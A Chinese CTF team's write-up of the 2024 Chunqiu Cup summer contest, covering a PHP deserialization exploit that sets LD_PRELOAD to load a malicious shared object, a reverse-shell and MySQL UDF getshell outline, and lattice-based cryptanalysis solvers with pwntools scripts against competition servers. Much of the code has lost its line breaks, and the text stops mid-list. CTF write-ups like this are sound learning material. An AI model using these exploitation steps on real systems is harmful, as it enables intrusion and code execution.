# 2024春秋杯网络安全联赛夏季赛- WriteUp By py一下&zwhubuntu

> 原文: https://www.ctfiot.com/193435.html
> ID: 193435

EDI

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn m方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

Web

1

Hijack

<?phpfunction filter($a){ $pattern = array(''', '"','%','(',')',';','bash'); $pattern = '/' . implode('|', $pattern) . '/i'; if(preg_match($pattern,$a)){ die("No injecting!!!"); } return $a;}class ENV{ public $key; public $value; public $math;
}class DIFF{ public $callback; public $back; private $flag;
}class FILE{ public $filename; public $enviroment;}class FUN{ public $fun; public $value;}

$e = new ENV();$e->math = new DIFF();$e->math->callback = new FILE();$e->math->callback->enviroment = new ENV();$e->math->callback->enviroment->key = "LD_PRELOAD";$e->math->callback->enviroment->value = "/tmp/fd1db20b118ef097af40bd312c32417e.so";echo urlencode(serialize($e));///tmp/ffdbcd469369686d0aeb664eca2a64e7.so///tmp/166dbdc87bcc964771cee85c8ffb1184.so// $e = new ENV();// $e->math = new DIFF();// $e->math->callback = new FUN();// $e->math->callback->fun = new FILE();// $e->math->callback->value = base64_encode(file_get_contents('1.so'));// $e->math->callback->fun->filename = "1.so";// echo urlencode(serialize($e));?>

2

brother

然后反弹shell

拿到shell 可以 再php 文件里发现 mysql 的用户名和密码，进数据库然后用 udf getshell cat flag

02

Misc

1

初探勒索病毒

2

class

def exp1(): import subprocess from pwn import pause f = 'class.py' link = [] # b"class _377AbcaF(): def _1459BC58(self): if -9462 < 3956: os.system('cat /flag')" cmd = 'system' while(1): io = subprocess.Popen(['/bin/sh','-c',f'cat class.py |grep {cmd} -B3'], stdout=subprocess.PIPE) data = io.stdout.read().replace(b'rn',b'').decode().split() #if data == b'': if data[1] == '_O0():': open('link','w').write(str(link[::-1])) pause() exit(0) cl = data[1][:-3] de = data[3][:-7] print(data) cmd = cl + '.' + de link.append(cmd) #print(link)

mdata = eval(open('link','r').read())[::-1][1:]print(len(mdata))
d = []#for i in range(30):for i in range(len(mdata)): #print(mdata[i]) #d.append(mdata[i][:-10][1:])
 d.append(mdata[i].replace('O','0').replace('_','').replace('.','')[:-8]) #print(mdata[i].replace('O','0').replace('_','').replace('.',''))
 #d.append(mdata[i].replace('O','0').replace('_','')[-8:]) #print(mdata[i].replace('O','0').replace('_','')[-8:])
 #d.append(mdata[i][-8:])
d = ''.join(d)open('data.7z','wb').write(bytes.fromhex(d))###import hashlib
#x = hashlib.md5(''.join(d).replace('.','').encode()).hexdigest()#print(x)

03

Crypto

1

ezecc

p = getPrime(256)a = getPrime(256)b = getPrime(256)E = EllipticCurve(GF(p),[a,b])m = E.random_point()G = E.random_point()k = getPrime(18)K = k * Gr = getPrime(256)c1 = m + r * K
c2 = r * G
cipher_left = s2n(flag[:len(flag)//2]) * m[0] #flag的前半部分乘m[0]，所以只要用密文的除于m[0]即可得到flag前半部分cipher_right = s2n(flag[len(flag)//2:]) * m[1]   #flag的后半部分点乘m[1]

p = koZP3YQAklARRNrmYfjxoKIAXegOcG4jMOmKb08uESOkCCn72d6UM2NWgefYPEMq4EJ1M0jKaqt02Guo5Ubccjqg4QZaaHbScREx38UMLQKwG0LcDd8VFX1zkobc1ZQn4L3DhKQrgJZI55todgOdJuHN532bxScAvOF26gJyQclPtRHn3M6SHrRCEXzzmszd68PJlLB6HaabrRrCW9ZoAYSZetM5jDBtNCJLpR0CBZUUk3Oeh2MZQu2vk8DZ1QqNG49hlxGfawp1FXvAZPdMwixzkhEQnbCDcOKzYyT6BZF2Dfd940tazl7HNOswuIpLsqXQ2h56guGngMeYfMXEZV09fsB3TE0N934CLF8TbZnzFzEkOe8TPTK2mWPVSrgmbsGHnxgYWhaRQWg3yosgDfrEa5qfVl9De41PVtTw024gltovypMXK5XMhuhogs0EMN7hkLapLn6lMjp的格式为p={p}
a = 87425770561190618633288232353256495656281438408946725202136726983601884085917b = 107879772066707091306779801409109036008421651378615140327877558014536331974777K = (49293150360761418309411209621405185437426003792008480206387047056777011104939 : 43598371886286324285673726736628847559547403221353820773139325027318579443479)G = (34031022567935512558184471533035716554557378321289293120392294258731566673565 : 74331715224220154299708533566163247663094029276428146274456519014761122295496)私钥k小于1000000c1 = (3315847183153421424358678117707706758962521458183324187760613108746362414091 : 61422809633368910312843316855658127170184420570309973276760547643460231548014)c2 = (12838481482175070256758359669437500951915904121998959094172291545942862161864 : 60841550842604234546787351747017749679783606696419878692095419214989669624971)cipher_left = 75142205156781095042041227504637709079517729950375899059488581605798510465939cipher_right = 61560856815190247060747741878070276409743228362585436028144398174723191051815

p可能是个脑洞，但是给了a,b

假设所有点都在曲线上，直接求p就可以了，求解得到p以后，构建椭圆曲线即可满足abel群

爆破一下私钥k就可以了

Exp：

from sage.all import *from Crypto.Util.number import *from tqdm import *from gmpy2 import *
a = 87425770561190618633288232353256495656281438408946725202136726983601884085917b = 107879772066707091306779801409109036008421651378615140327877558014536331974777K = (49293150360761418309411209621405185437426003792008480206387047056777011104939,43598371886286324285673726736628847559547403221353820773139325027318579443479)G = (34031022567935512558184471533035716554557378321289293120392294258731566673565,74331715224220154299708533566163247663094029276428146274456519014761122295496)c1 = (3315847183153421424358678117707706758962521458183324187760613108746362414091,61422809633368910312843316855658127170184420570309973276760547643460231548014)c2 = (12838481482175070256758359669437500951915904121998959094172291545942862161864,60841550842604234546787351747017749679783606696419878692095419214989669624971)cipher_left = 75142205156781095042041227504637709079517729950375899059488581605798510465939cipher_right = 61560856815190247060747741878070276409743228362585436028144398174723191051815
f1 = G[0]^3+a*G[0]+b-G[1]^2f2 = c1[0]^3+a*c1[0]+b-c1[1]^2p = gcd(int(f1),int(f2))print(p)print(isPrime(p))print(len(bin(p)))
E = EllipticCurve(GF(p),[a,b])C1 = E(c1)C2 = E(c2)for k in tqdm(range(166000,1000000)): m = C1 - k*C2 left = cipher_left*invert(int(m[0]),int(p))%int(p) right = cipher_right*invert(int(m[1]),int(p))%int(p) if b'flag{' in long_to_bytes(int(left)): print(k) print(long_to_bytes(int(left))) print(long_to_bytes(int(right)))        break

Flag: flag{2d6a7e4e-02d3-11ef-8836-a4b1c1c5a2d2}

2

Signatrue

import osimport hashlibfrom Crypto.Util.number import *from Crypto.PublicKey import DSAimport randomdef gen_proof_key(): password = 'happy_the_year_of_loong' getin = '' for i in password: if random.randint(0, 1): getin += i.lower() else: getin += i.upper() ans = hashlib.sha256(getin.encode()).hexdigest() return getin,ans
def gen_key(): pri = random.randint(2,q - 2) pub = pow(g,pri,p) return pri,pub
def sign(m,pri): k = int(hashlib.md5(os.urandom(20)).hexdigest(),16) H = int(hashlib.sha256(m).hexdigest(),16) r = pow(g,k,p) % q s = pow(k,-1,q) * (H + pri * r) % q return r,s
def verify(pub,m,signature): r,s = signature if r <= 0 or r >= q or s <= 0 or s >= q: return False w = pow(s,-1,q) H = int(hashlib.sha256(m).hexdigest(),16) u1 = H * w % q u2 = r * w % q v = (pow(g,u1,p) * pow(pub,u2,p) % p) % q return v == r
def login(): print('Hello sir,Plz login first') menu = ''' 1.sign 2.verify 3.get my key ''' times = 8 while True: print(menu) if times < 0: print('Timeout!') return False choice = int(input('>')) if choice == 1: name = input('Username:').encode() if b'admin' in name: print('Get out!') return False r,s = sign(name,pri) print(f'This is your signature -- > {r},{s}') times -= 1 elif choice == 2: print('Sure,Plz input your signature') print(pri) r = int(input('r:')) s = int(input('s:')) if verify(pub,b'admin',(r,s)) == True: print('login success!') return True else: print('you are not admin') return False elif choice == 3: print(f'Oh,your key is {(p,q,g)}')getin,ans = gen_proof_key()print(f'Your gift --> {ans[:6]}')your_token = input('Plz input your tokenn>')if your_token != getin: print('Get out!') exit(0)
key = DSA.generate(1024)p, q, g = key.p, key.q, key.gpri, pub = gen_key()if login() == False: exit(0)print(open('/flag','r').read())

from pwn import *import itertoolsfrom tqdm import tqdmimport hashlibimport osimport hashlibfrom Crypto.Util.number import *from Crypto.PublicKey import DSAfrom random import choicesimport stringfrom gmpy2 import *
# nc 8.147.128.163 18401# nc 8.147.128.22 31575# nc 8.147.128.163 42487# nc 39.106.48.123 39979# nc 8.147.132.12 21188
def pass_proof(head): password = 'happytheyearofloong' table = itertools.product([0,1],repeat=19) for i in tqdm(table): getin = '' for j in range(len(i)): if i[j] == 0: getin += password[j].lower() else: getin += password[j].upper() msg =getin[:5]+"_"+getin[5:8]+"_"+getin[8:12]+"_"+getin[12:14]+"_"+getin[14:] h = hashlib.sha256(msg.encode()).hexdigest() if h[:6] == head: print(msg) return msg
def sign(pubkey, x, msg, k): p, q, g = pubkey r = int(pow(g, k, p)) % q Hm = int(hashlib.sha256(msg).hexdigest(),16) s = (Hm + x * r) * inverse(k, q) % q return (r, s)
table = string.ascii_lowercase
io = remote('8.147.132.12', '21188')s1,s2 = io.recv().strip().split(b'-->')s2 = s2.strip().decode()print("s2=",s2)
ss = pass_proof(s2)print("ss=",ss)io.sendlineafter(b'>',ss)io.sendlineafter(b'>',b'3')#print(io.recv())
s3 = io.recv().strip().replace(b'n',b'')print(s3)s5 = s3.replace(b'Oh,your key is ',b'')print(s5)(p,q,g)=eval(s5)print("p=",p)print("q=",q)print("g=",g)
#io.interactive()#io.interactive()
R = []S = []H = []for i in range(8): io.recvuntil(b">") io.sendline(b"1") io.recvuntil(b"Username:") m = "".join(choices(table,k=16)) msg = m.encode() h = int(hashlib.sha256(msg).hexdigest(),16) io.sendline(msg) io.recvuntil(b"This is your signature -- > ") data1 = eval(io.recvline().decode().strip()) r,s = data1 #print(r,s) S.append(s) R.append(r) H.append(h)
print("R=",R)n = len(S)r0 = R[0]s0 = S[0]h0 = H[0]pubkey = (p,q,g)
A = []B = []
for i in range(1,len(R)): a = R[i]*s0 *invert(r0*S[i],q) % q b = (r0*H[i] - R[i]*h0)*invert(r0*S[i],q) % q A.append(a) B.append(b)
n = len(A)Ge = Matrix(ZZ,n+2,n+2)for i in range(n): Ge[i,i] = q Ge[-2,i] = A[i] Ge[-1,i] = B[i]
K = 2**128Ge[-2,-2] = 1Ge[-1,-1] = K
for line in Ge.BKZ(block_size=30): if abs(line[-1]) == K: k0 = line[-2] d = (k0 * s0 - h0) * invert(r0,q) % q print("d=",d) sig = sign(pubkey,d,b'admin',k0) r,s = sig io.recvuntil(b">") io.sendline(b"2") io.sendlineafter(b"r:",str(r).encode()) io.sendlineafter(b"s:",str(s).encode())
io.interactive()

Flag: flag{7b640bd1-367c-4c8e-b656-315e7596ad85}

3

2024happy

from Crypto.Util.number import *
CBC_key = b''
p,q = getPrime(512),getPrime(512)n = p * qN = n**2 + 2024hint = (pow(3, 2022, N) * p**2 + pow(5, 2022, N) * q**2) % Nc = pow(bytes_to_long(CBC_key), 65537, n)
print('n =', n)print('h =', hint)print('c =', c)
'''n = 104765768221225848380273603921218042896496091723683489832860494733817042387427987244507704052637674086899990536096984680534816330245712225302233334574349506189442333792630084535988347790345154447062755551340749218034086168589615547612330724516560147636445207363257849894676399157463355106007051823518400959497h = 7203581190271819534576999256270240265858103390821370416379729376339409213191307296184376071456158994788217095325108037303267364174843305521536186849697944281211331950784736288318928189952361923036335642517461830877284034872063160219932835448208223363251605926402262620849157639653619475171619832019229733872640947057355464330411604345531944267500361035919621717525840267577958327357608976854255222991975382510311241178822169596614192650544883130279553265361702184320269130307457859444687753108345652674084307125199795884106515943296997989031669214605935426245922567625294388093837315021593478776527614942368270286385c = 86362463246536854074326339688321361763048758911466531912202673672708237653371439192187048224837915338789792530365728395528053853409289475258767985600884209642922711705487919620655525967504514849941809227844374505134264182900183853244590113062802667305254224702526621210482746686566770681208335492189720633162'''
from not2022but2024 import CBC_keyfrom Crypto.Util.Padding import pad
flag = b'flag{}'from Crypto.Cipher import AESfrom hashlib import sha256import random
n = 31m = 80M = random_prime(2^256)As = [random.randrange(0,M) for i in range(n)]xs = [random_vector(GF(2),m).change_ring(ZZ) for i in range(n)]Bs = sum([As[_] * vector(Zmod(M),xs[_]) for _ in range(n)]).change_ring(ZZ)
IV = sha256(str(int(sum(As))).encode()).digest()[:16]aes = AES.new(CBC_key,AES.MODE_CBC,iv=IV)cipher = aes.encrypt(pad(flag,16))print(cipher)print(Bs)print(M)
"""b'%x97xf77x16.x83x99x06^xf2h!kxfaN6xb0x19vd]x04Bx9e&xc1Vxedxa3x08gXxb2xe3x16xc2yxf5/xb1x1f>xa1xa0DOxc6gyxf2lx1exe89xaeUxf7x9dx03xe5xcd*{'(53844623749876439509532172750379183740225057481025870998212640851346598787721, 15997635878191801541643082619079049731736272496140550575431063625353775764393, 8139290345909123114252159496175044671899453388367371373602143061626515782577, 51711312485200750691269670849294877329277547032926376477569648356272564451730, 56779019321370476268059887897332998945445828655471373308510004694849181121902, 11921919583304047088765439181178800943487721824857435095500693388968302784145, 41777099661730437699539865937556780791076847595852026437683411014342825707752, 68066063799186134662272840678071052963223888567046888486717443388472263597588, 62347360130131268176184039659663746274596563636698473727487875097532115406559, 5552427086805474558842754960080936702720391900282118962928327391068474712240, 48174546926340119542515098715425118344495523250058429245324464327285482535849, 8793683612853105242264232876135147970346410658466322451040541263235700009570, 78872313670499828088921565348302137515276635926740431961166334829533274321063, 45986964918902932699857479987521822871519141147943250535680974229322816549720, 5539445840707805914548390575494054384665037598195811353312773359759245783130, 20826977782899762485848762121688687172338304931446040988601154085704702880401, 46412211529487215742337744878389285037116176985579657423264681199244501574725, 50741521861819713251561088062479658512988690918747542471827101566427731303416, 2657362476409491643067267745198536051013594201408763262228104521443406410606, 44328850588851214219220815931558890597249087261312360172796979417041192180750, 17240480010040498121198897919561403023278264974274103780966819232080038065027, 76464770903606818697905572779761942703446600798395362596698226797476804541350, 68085613496380272855135907856973365357126900379731050931749074863934645465000, 9526872466819179025323613184178423510032119770349155497772862700507205270355, 28561337010953007345414455535991538568670238712225998300322929406204673707677, 39182834208152122329027105134597748924433413223238510660062164011424607149326, 19600894094417831727934201861135428039216930531542618497625138063955073257655, 33328666355366104030800248593757531247937582259417117239494927842284231531315, 27309478993506749161736165865367616487993717640890015043768259212155864131357, 32466044572968154084881296026899630667525833604042642990295342316076396001186, 49980145403553319854613749104421978583845098879328180142454823188167202440531, 38902032967058543060885229430655776526806612465844770409338358289020456837934, 78745490507168848644435092323691842070096557975478968062804777954092505226481, 29262215059225133132435433010691828148944958395141222387754208495595513295896, 6511387460586172200641169204557875679554320457409786241141816573577911255491, 66384481485687195909117407019475796131750762463683904604078327730810293442381, 423759905526048383541413041558602466949757468395447771021215945027193456079, 22783408973585275782090957855992582495700723663661365548067357177569979041893, 68353193576625297253561095680880135893826094396013897100461325445097220567952, 43167069172003777333498030236780725018297276760410131777676641770086016833895, 64358541048274393300028483577573557871346089755363306971761786692679519831483, 21556895066359380729591004278007242407987861350911480029337345312081293559522, 44577165826706395273335181181407938788716768576602201516787959082367484270939, 78757778436852423927977028333940102206341452120720821559562765928972163293676, 44086875063535769349025637423479101247594814134304419072849625465484225865969, 14807706619359620049095657244485266549982349493285112282927264862821502986777, 43450687889967222089875050731849984583914520350091026482076939962301357700844, 1474778474197964170746922000689413626959960404877093741742022788928758658052, 79005121352540562329295808987757987563818908122338120731119811866179839023066, 47361429831079185336051370209844150786334814579472466274050224935364333043476, 8909641306798261411104006708035991379862284048887418817598377473145077145642, 44993528669446910461207972446344484798499156885515181685694150462051560323869, 60204243272925546012169935228277233636280408169577344559847112958669050860101, 66809206609934431859673802937592425152676610053648406215573441926481740948749, 48623757302381792245138496825183044619235050623516633984941208604059757210728, 74934019261870654132458355068539987475536823529848461398042458398130801089348, 81278897734052917585963333108338812132716202790194259021265555401046891572210, 41418370274745377550600009352057265922713132669834032188979684042175922204024, 73981010754794931896065529724613353453372905938901875720094092383581574259191, 11510558496830929812186594415924901190526760075439658941646537744390447056913, 12871197940932509721689273944282764851472299179520294551038550766143300003239, 13125880938267970248643653453332470640527994428672724309079849030361661332656, 54395419708886945822916038876690794705789028459055268227222784885329659953982, 61086065362549289820758257234061183781820530343096737751500151263095654158833, 82468574289042215923908109910435173164917593677419944115441863191433795206895, 74824772928304750096519403623184368585460834399443013973554958461695733158569, 62083272769549467370505302454770858941632031970595402929903886003242570089639, 32887658447648473554892464271221330218759930615421257444587260809741011575629, 61429802749826163386356730793012182546392982886506956044525858721859869425131, 5026334434650853992374810127604777276035123569907012144091150436739161826287, 45670628392162402176230172863069957038704667046592086395237022845943911838596, 75520245720261510582172547313413372786802547571090110489287163846652239401646, 58965653594414801363386215405590061806834352303047020261264473838037335631061, 58420763657138617301836404602193276258504426799372302098717637069900583548539, 59706321905964570794806865247363209194143775670139452625484601579677510881069, 58198559234141523043769073193017418608700536234755760366044515212056701655389, 63604949023865770163110419193113341020042474142600282131130750460724114084001, 83394429495100363085521124642271430199140318544724150468993097819105267094727, 69274794456073656789648159458959148992942789823222968847070524400609637893875, 46951397339712109206750633799342393646147684284310708226074432825222250739146)83509079445737370227053838831594083102898723557726396235563637483818348136543"""

https://tanglee.top/2023/12/12/Orthogonal-Lattice-Attack/

https://github.com/tl2cents/Implementation-of-Cryptographic-Attacks/blob/f83d71d8fe83e01ba6a684965cef61861437ff23/MultivariateHSSP/A%20Polynomial-Time%20Algorithm%20for%20Solving%20the%20Hidden%20Subset%20Sum%20Problem.ipynb

from sage.all import *from Crypto.Util.number import *from gmpy2 import *from sage.matrix.matrix2 import Matrix as Matrix2import timefrom collections.abc import Iterablefrom sage.modules.free_module_integer import IntegerLatticeimport time
#part 1n = 104765768221225848380273603921218042896496091723683489832860494733817042387427987244507704052637674086899990536096984680534816330245712225302233334574349506189442333792630084535988347790345154447062755551340749218034086168589615547612330724516560147636445207363257849894676399157463355106007051823518400959497h = 7203581190271819534576999256270240265858103390821370416379729376339409213191307296184376071456158994788217095325108037303267364174843305521536186849697944281211331950784736288318928189952361923036335642517461830877284034872063160219932835448208223363251605926402262620849157639653619475171619832019229733872640947057355464330411604345531944267500361035919621717525840267577958327357608976854255222991975382510311241178822169596614192650544883130279553265361702184320269130307457859444687753108345652674084307125199795884106515943296997989031669214605935426245922567625294388093837315021593478776527614942368270286385c = 86362463246536854074326339688321361763048758911466531912202673672708237653371439192187048224837915338789792530365728395528053853409289475258767985600884209642922711705487919620655525967504514849941809227844374505134264182900183853244590113062802667305254224702526621210482746686566770681208335492189720633162N = n**2 + 2024
a = int(pow(3, 2022, N))b = int(pow(5, 2022, N))T = 2^2048
pbit = 5qbit = 5
for lp in range(2**pbit): for lq in range(2**qbit): hh = h - a*lp - b*lq L = matrix(ZZ,4,4,[[1,0,T*a*2**pbit,0], [0,1,T*b*2**qbit,0], [0,0,T*N,0], [0,0,T*hh,N] ]) res = L.LLL() for row in res: if abs(row[-1]) == N: p = gcd(n,abs(row[0])*2**pbit+lp) q = gcd(n,abs(row[1])*2**qbit+lq) if p>1 or q>1: print("p=",p) print("q=",q) phi = (p - 1)*(q - 1) d = invert(65537,phi) m = pow(c,d,n) print(long_to_bytes(int(m))) break#key = b'mylove_in_summer'
#part 2n = 31m = 80BS=(…)p = 35119411868157074664430974548068674543332670208412768267028980956903083749789
F = GF(p)h = vector(Bs)
#print("h=",h)
def find_ortho_fp(*vecs): assert len(set(len(v) for v in vecs)) == 1 L = block_matrix(ZZ, [[matrix(vecs).T, matrix.identity(len(vecs[0]))], [ZZ(p), 0]]) print("LLL", L.dimensions()) nv = len(vecs) L[:, :nv] *= p L = L.LLL() ret = [] for row in L: if row[:nv] == 0: ret.append(row[nv:]) return matrix(ret)

def find_ortho_zz(*vecs): assert len(set(len(v) for v in vecs)) == 1 L = block_matrix(ZZ, [[matrix(vecs).T, matrix.identity(len(vecs[0]))]]) print("LLL", L.dimensions()) nv = len(vecs) L[:, :nv] *= p L = L.LLL() ret = [] for row in L: if row[:nv] == 0: ret.append(row[nv:]) return matrix(ret)
Mh = find_ortho_fp(h)assert Mh * h % p == 0#print(Mh)
#L = Mh.LLL()#print(L)
Lx = find_ortho_zz(*Mh[: m - n])#print("Lx=",Lx)'''res = Lx.LLL()print(res)alpha = Lx.solve_right(h)print(alpha)'''def allones(v): if len([vj for vj in v if vj in [0, 1]]) == len(v): return v if len([vj for vj in v if vj in [0, -1]]) == len(v): return -v return None

def recoverBinary(M5): lv = [allones(vi) for vi in M5 if allones(vi)] n = M5.nrows() for v in lv: for i in range(n): nv = allones(M5[i] - v) if nv and nv not in lv: lv.append(nv) nv = allones(M5[i] + v) if nv and nv not in lv: lv.append(nv) return Matrix(lv)xs = recoverBinary(Lx)print(xs)
alpha = h*xs.inverse()print(alpha)

from collections.abc import Iterablefrom sage.modules.free_module_integer import IntegerLatticeimport timefrom Crypto.Cipher import AESfrom hashlib import sha256
# https://github.com/Neobeo/HackTM2023/blob/main/solve420.sagedef flatter(M): from subprocess import check_output from re import findall M = matrix(ZZ,M) # compile https://github.com/keeganryan/flatter and put it in $PATH z = '[[' + ']n['.join(' '.join(map(str,row)) for row in M) + ']]' ret = check_output(["flatter"], input=z.encode()) return matrix(M.nrows(), M.ncols(), map(int,findall(b'-?\d+', ret)))
def gen_hssp(n = 10, m = 20, Mbits = 100): M = random_prime(2^Mbits, proof = False, lbound = 2^(Mbits - 1)) # alpha vectors a = vector(ZZ, n) for i in range(n): a[i] = ZZ.random_element(M)
 # The matrix X has m rows and must be of rank n while True: X = random_matrix(GF(2), m, n).change_ring(ZZ) if X.rank() == n: break
 # Generate an instance of the HSSP: h = X*a % M h = X * a % M return M, a, X, h
# compute kernel space and obtain an LLL-reduced basisdef kernel_LLL(vec_mat, mod=None, verbose=False, w=None): """ Input : vec_mat : m * n matrix, the m vectors are : v1,..., vm in Z^n mod : if mod is not None, we find kernel in Zmod(mod) else in ZZ Output : B : matrix, an LLL-reduced basis b1,b2,...,bk such that bi * vj for all i in [1,k], j in [1,m] """ m, n = vec_mat.dimensions() if mod is None: # if n < 2*m : return vec_mat.right_kernel().matrix() if w is None : w=2^(n//2)* vec_mat.height() M = block_matrix(ZZ, [w * vec_mat.T, 1], ncols = 2).dense_matrix() else: if w is None : w = 2^(ZZ(mod).nbits()) M = block_matrix(ZZ, [ [w * vec_mat.T, 1], [w * mod, 0] ]).dense_matrix() if verbose: print(f" [*] start to LLL reduction with dim {M.dimensions()}") # L = M.LLL() t0 = time.time() L = flatter(M) t1 = time.time() if verbose: print(f" [+] LLL reduction done in {t1 -t0}") # filter orthogonal vectors basis = [] for row in L: if row[:m] == 0: # orthogonal vector basis.append(row[m:m+n]) if verbose: print(f" [+] find {len(basis)} orthogonal vectors for {m} {n}-dim vectors") return matrix(ZZ, basis)
def derive_mod_bits(n): iota=0.035 mod_bits=int(2 * iota * n^2 + n * log(n,2)) return mod_bits

def ol_attack(h, m, n , M, verbose=False): """ HSSP : h = X * a % M Input : h : hssp result m-dim vector m,n : X.dimensions() M : the mod Output: the basis b1, ..., bn generating x1,...,xn (column vectors of X) """ H = matrix(ZZ,h) # we only need m - n generating basis basis = kernel_LLL(H, mod = M, verbose=verbose)[:m - n] # check assert basis * H.T % M == 0, "not kernel, do check" # the basis is orthogonal to x_i in ZZ by assumption # try to recover the basis of xi xi_basis = kernel_LLL(basis, verbose=verbose) return xi_basis

def check_matrix(M, white_list = [1,0,-1]): # check wheter all values in M fall into white_list for row in M: for num in row: if num not in white_list: return False return True
def all_ones(v): if len([vj for vj in v if vj in [0,1]])==len(v): return v if len([vj for vj in v if vj in [0,-1]])==len(v): return -v return None
def recover_binary_basis(basis): lv = [all_ones(vi) for vi in basis if all_ones(vi)] n = basis.nrows() for v in lv: for i in range(n): nv = all_ones(basis[i] - v) if nv and nv not in lv: lv.append(nv) nv = all_ones(basis[i] + v) if nv and nv not in lv: lv.append(nv) return matrix(lv)
def find_original_basis(basis, new_basis): n, m = basis.dimensions() origin_lattice = IntegerLattice(basis) origin_basis = [] for row in new_basis: if sum(row) == m: continue # seems like we cannot determine wether 1,-1 represents 1 or 0 in this lattcie # therefore we do some checking in the original lattice v = vector(ZZ, [1 if num == 1 else 0 for num in row]) if v in origin_lattice: origin_basis.append(v) else: v = vector(ZZ, [0 if num == 1 else 1 for num in row]) assert v in origin_lattice, "oops, something wrong" origin_basis.append(v) return matrix(ZZ, origin_basis)

def recover_binary_basis_by_lattice(basis, blocksize = None): new_lattice = 2 * basis n, m = basis.dimensions() new_lattice = new_lattice.insert_row(0, [1] * m) if blocksize is None: # new_basis = new_lattice.LLL() new_basis = flatter(new_lattice) else: new_basis = new_lattice.BKZ(block_size = blocksize)
 if not check_matrix(new_basis, [1,-1]): print("[+] fails to recover basis") return None
 origin_lattice = IntegerLattice(basis) origin_basis = [] for row in new_basis: if sum(row) == m: continue # seems like we cannot determine wether 1,-1 represents 1 or 0 in this lattcie # therefore we do some checking in the original lattice v = vector(ZZ, [1 if num == 1 else 0 for num in row]) if v in origin_lattice: origin_basis.append(v) else: v = vector(ZZ, [0 if num == 1 else 1 for num in row]) assert v in origin_lattice, "oops, something wrong" origin_basis.append(v) return matrix(ZZ, origin_basis)
# Nguyen-Stern attack using greedy method mentioned in appendix D of https://eprint.iacr.org/2020/461.pdfdef ns_attack_greedy(h, m, n, M, bkz = range(2,12,2), verbose=True): t0 = time.time() if verbose: print(f"[*] start to ns attack with greedy method") xi_basis = ol_attack(h, m, n, M) assert isinstance(bkz, Iterable), "give a list or iterable object as block_size para" L = xi_basis if verbose: print(f" [+] basis dimensions : {L.dimensions()}") assert L.dimensions() == (n,m) , "basis generating xi's is not fully recovered" for bs in bkz: if verbose: print(f" [*] start to BKZ reduction with block_size {bs}") L = L.BKZ(block_size = bs) if verbose: print(f" [+] BKZ reduction with block_size {bs} done") if check_matrix(L,[-1,1,0]): if verbose: print(" [+] find valid basis") break
 XT = recover_binary_basis(L) if verbose: print(f" [+] Number of recovered xi vectors {XT.nrows()}") if XT.nrows() < n: print(f" [+] not enough xi vectors recovered, {XT.nrows()} out of {n}") print(f" [*] trying new lattice recovery...") XT = recover_binary_basis_by_lattice(L) if XT.nrows() < n: print(f"[+] failed.") return False, L X = XT.T # h = X * a a = matrix(Zmod(M) ,X[:n]).inverse() * vector(Zmod(M),h[:n]) t1 = time.time() if verbose : print(f" [+] total time cost in {t1 - t0}") return True, a
# Nguyen-Stern attack using 2*Lx + E lattice methoddef ns_attack_2Lx(h, m, n, M, bkz = range(2,12,2), verbose=True): t0 = time.time() if verbose: print(f"[*] start to ns attack with 2*Lx + E method") xi_basis = ol_attack(h, m, n, M) assert isinstance(bkz, Iterable), "give a list or iterable object as block_size para" # we use the new lattice : 2 * basis + [1, ..., 1], the final vectors all fall into [-1, 1] L = 2 * xi_basis L = L.insert_row(0, [1] * m) if verbose: print(f" [+] basis dimensions : {L.dimensions()}") assert L.dimensions() == (n + 1, m) , "basis generating xi's is not fully recovered" for bs in bkz: if verbose: print(f" [*] start to BKZ reduction with block_size {bs}") L = L.BKZ(block_size = bs) if verbose: print(f" [+] BKZ reduction with block_size {bs} done") if check_matrix(L,[-1,1]): if verbose: print(" [+] find valid basis") break
 XT = find_original_basis(xi_basis, L) if verbose: print(f" [+] Number of recovered xi vectors {XT.nrows()}") if XT.nrows() < n: return False, L X = XT.T # h = X * a a = matrix(Zmod(M) ,X[:n]).inverse() * vector(Zmod(M),h[:n]) t1 = time.time() if verbose : print(f" [+] total time cost in {t1 - t0}") return True, a
if __name__ == "__main__": n = 31 m = 80 #Mbits = derive_mod_bits(n) #M, a, X, h = gen_hssp(n, m, Mbits) h = (…) M = 83509079445737370227053838831594083102898723557726396235563637483818348136543 key = b'mylove_in_summer' enc = b'%x97xf77x16.x83x99x06^xf2h!kxfaN6xb0x19vd]x04Bx9e&xc1Vxedxa3x08gXxb2xe3x16xc2yxf5/xb1x1f>xa1xa0DOxc6gyxf2lx1exe89xaeUxf7x9dx03xe5xcd*{' find, recovered_a = ns_attack_greedy(h, m, n, M, range(2,32,4)) if find: #print(f"[+] check {sorted(a) == sorted(recovered_a)}") print("sa=",sorted(recovered_a)) As = sorted(recovered_a) print("As=",As) Ks = [1711700737596942098141587005897001923467148527501577453789847339309231014017, 5875188077052480648232418600824969595720497866536009964666718026546377402659, 7424747337670606381224459936040537522272415300965552412233924440467013214929, 8925537770455527862314319644047361428098122679784046750260385465279524640758, 9410411882949099686377523275038221900647373498185543944914937627443580777895, 9818277845057785226128434266733702357140476441767426182691949404574739864471, 10681847555461399902210862175396453305202670534308493529688939268141672580198, 13437578070400039871447629276288782597377013054748122396902167721942284558085, 14688963368014138891742867302197417412347255697512170452902543642849457063220, 16065558341593994678278335676072994953750074623151334988183861626283964758705, 24109852473418884476019504643346847100268787657659745204234606030014282828985, 24971016647756767660198603093800996644347858001073386304943043863175784231084, 28393466379196565996737944366258699998436604896580168639374332657489975464601, 31428070075963288077422965654196305405378386092416488300386029039813403199212, 32693886981999180270054401707859285735740758568756949747151570025510492214617, 39971965328389179006201634509526724734245000895147926249125775373526091102708, 49134062274507301776274599170938642488704463744351451702654137784332525774376, 49167114207020052222521184151837367841356631663358176773402293991474159882092, 50677991534126079994158927773953299589065239762692927522732479082145177237596, 52681041949334573767794493491168964159221887007215214120559489821086961661278, 57069373872527795267207764660002470738840662888561030895771185521877196347825, 57926274006695718443248286140826994828819362097860891625687150766841503445227, 58567580672456602209669909439188074270723927891214333393676636128662696332054, 58654160939328990050906600214380469574397498119226424016406604809243380684046, 62191998503348002721549751412603698438420814449668296521249993454538200533849, 65958758207359528976256822298643817856263524606065102965597229913330035994172, 67885972767109670871569234926960013411787540132588293510655488187382461618010, 